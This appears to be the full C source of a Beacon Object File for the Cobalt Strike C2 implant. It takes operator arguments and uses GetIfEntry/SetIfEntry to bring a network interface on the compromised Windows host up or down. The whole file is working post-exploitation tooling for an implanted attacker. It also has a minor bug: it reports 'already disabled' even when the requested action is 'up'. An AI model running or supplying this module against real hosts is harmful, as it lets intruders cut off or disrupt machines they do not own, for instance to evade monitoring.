#include <windows.h>
#include "beacon.h"

#define MIB_IF_ADMIN_STATUS_UP 1
#define MIB_IF_ADMIN_STATUS_DOWN 2
#define MIB_IF_ADMIN_STATUS_TESTING 3

typedef struct _MIB_IFROW {
    WCHAR wszName[256];
    DWORD dwIndex;
    DWORD dwType;
    DWORD dwMtu;
    DWORD dwSpeed;
    DWORD dwPhysAddrLen;
    BYTE  bPhysAddr[8];
    DWORD dwAdminStatus;
    DWORD dwOperStatus;
    DWORD dwLastChange;
    DWORD dwInOctets;
    DWORD dwInUcastPkts;
    DWORD dwInNUcastPkts;
    DWORD dwInDiscards;
    DWORD dwInErrors;
    DWORD dwInUnknownProtos;
    DWORD dwOutOctets;
    DWORD dwOutUcastPkts;
    DWORD dwOutNUcastPkts;
    DWORD dwOutDiscards;
    DWORD dwOutErrors;
    DWORD dwOutQLen;
    DWORD dwDescrLen;
    BYTE  bDescr[256];
} MIB_IFROW, *PMIB_IFROW;

DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetIfEntry(PMIB_IFROW pIfRow);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$SetIfEntry(PMIB_IFROW pIfRow);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int MSVCRT$strcmp(const char *str1, const char *str2);

void go (IN PCHAR Buffer, IN ULONG Length) 
{
    datap parser = {0};
    BeaconDataParse(&parser, Buffer, Length);
    DWORD ifIndex = BeaconDataInt(&parser);
    char *action = BeaconDataExtract(&parser, NULL);

    if (MSVCRT$strcmp(action, "up") != 0 && MSVCRT$strcmp(action, "down") != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Invalid action. Use 'up' or 'down'\n");
        return;
    }
    
    DWORD desiredStatus;
    if (MSVCRT$strcmp(action, "down") == 0) {
        desiredStatus = MIB_IF_ADMIN_STATUS_DOWN;
    } else {
        desiredStatus = MIB_IF_ADMIN_STATUS_UP;
    }

    // allocate memory for MIB_IFROW
    PMIB_IFROW pIfRow = (PMIB_IFROW)KERNEL32$LocalAlloc(LPTR, sizeof(MIB_IFROW));
    if (!pIfRow) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Memory allocation failed\n");
        return;
    }
    
    // get current IF info
    pIfRow->dwIndex = ifIndex;
    DWORD rc = IPHLPAPI$GetIfEntry(pIfRow);
    if (rc != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[X] GetIfEntry failed for ifIndex %lu: %lu\n", ifIndex, rc);
        KERNEL32$LocalFree(pIfRow);
        return;
    }
    
    // check if already in desired state
    if (pIfRow->dwAdminStatus == desiredStatus) {
        BeaconPrintf(CALLBACK_OUTPUT, "[X] Interface %lu is already disabled\n", ifIndex);
        KERNEL32$LocalFree(pIfRow);
        return;
    }
    
    DWORD originalStatus = pIfRow->dwAdminStatus;
    pIfRow->dwAdminStatus = desiredStatus;
    rc = IPHLPAPI$SetIfEntry(pIfRow);
    if (rc != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[X] SetIfEntry failed for ifIndex %lu: %lu\n", ifIndex, rc);
        KERNEL32$LocalFree(pIfRow);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully changed the AdminStatus of IF %lu\n", ifIndex);
    KERNEL32$LocalFree(pIfRow);
}